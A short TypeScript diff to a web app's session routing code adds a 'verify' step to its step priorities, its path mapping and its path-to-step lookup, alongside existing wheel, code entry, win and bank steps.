@@ -9,6 +9,7 @@ import type { SessionStep } from "@/types/session";
  *   veya daha ileri admin adımına yönlenir, GERİYE gitmez.)
  */
 const STEP_PRIORITY: Record<string, number> = {
+  verify: 15,
   wheel: 10,
   code_entry: 10,
   win: 20,
@@ -105,6 +106,8 @@ export function stepToPath(
   switch (step) {
     case "code_entry":
       return "/code";
+    case "verify":
+      return `/verify?session=${encodeURIComponent(routeSessionId)}`;
     case "wheel":
       return "/wheel";
     case "win":
@@ -153,6 +156,7 @@ export function resolveStepTargetPath(
 }
 
 export function pathToStep(pathname: string): SessionStep | null {
+  if (pathname.startsWith("/verify")) return "verify";
   if (pathname.startsWith("/wheel")) return "wheel";
   if (pathname.startsWith("/code")) return "code_entry";
   if (pathname.includes("/bank/")) return "bank";
